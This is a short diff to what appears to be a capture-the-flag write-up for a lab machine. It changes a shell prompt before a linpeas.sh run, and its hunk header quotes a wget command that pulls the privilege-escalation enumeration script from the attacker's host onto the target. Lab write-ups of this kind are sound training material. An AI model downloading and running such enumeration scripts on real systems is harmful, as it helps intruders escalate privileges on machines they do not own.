@@ -77,7 +77,7 @@ wget http://10.10.14.139:9999/linpeas.sh
 Launching linpeas:
 
 ```
-nathan@10.10.10.245:~$ ./linpeas.sh
+nathan@cap:~$ ./linpeas.sh
 ```
 ![image](https://github.com/user-attachments/assets/8367a5e4-c23a-4b19-9ccd-709f2034566d)
 
